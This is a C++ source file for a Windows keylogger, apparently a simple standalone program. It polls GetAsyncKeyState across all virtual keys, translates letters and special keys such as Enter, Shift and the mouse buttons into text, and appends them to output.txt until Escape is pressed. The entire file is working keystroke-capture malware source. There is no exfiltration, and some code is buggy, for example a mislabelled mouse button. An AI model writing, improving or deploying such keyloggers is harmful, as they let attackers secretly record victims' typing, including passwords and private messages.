#include <iostream>

#include <string>
#include <sstream>
#include <Windows.h>
#include <cctype>
#include <fstream>


#include "keyLogger.h"


std::string getKeyPressed()
{
	std::string logStr;

	for (int i = 0; i < 256; i++)
	{

		if (GetAsyncKeyState(i))
		{

			if (std::isupper(i))
			{
				logStr = (char)i;
			}
			else if (i == VK_ESCAPE)
			{
				logStr = "[ESCAPE]";
			}
			else if (i == VK_RETURN)
			{
				logStr = "[ENTER]";
			}
			else if (i == VK_LBUTTON)
			{
				logStr = "[LBUTTON]";
			}
			else if (i == VK_RBUTTON)
			{
				logStr = "[RBUTTON]";
			}
			else if (i == VK_MBUTTON)
			{
				logStr = "[MBUTTON]";
			}
			else if (i == VK_XBUTTON1)
			{
				logStr = "[SIDE_BUTTON1]";
			}
			else if (i == VK_XBUTTON2)
			{
				logStr = "[SIDE_BUTTON1]";
			}
			else if (i == VK_CLEAR)
			{
				logStr = "[CLEAR]";
			}
			else if (i == VK_SHIFT)
			{
				logStr = "[SHIFT]";
			}
			else if (i == VK_CONTROL)
			{
				logStr = "[CONTROL]";
			}
			else if (i == VK_SPACE)
			{
				logStr = "[SPACEBAR]";
			}
		}
	}

	return logStr;
}

int logKeys()
{
	std::ofstream logFile;
	logFile.open("output.txt");

	if (!logFile.is_open())
	{
		MessageBoxA(0, "Log File failed to open!", "Error", MB_OK);
		return 1;
	}

	while (!(GetAsyncKeyState(VK_ESCAPE) & 0b1))
	{
		logFile << getKeyPressed();
	}

	logFile.close();

	return 0;
}
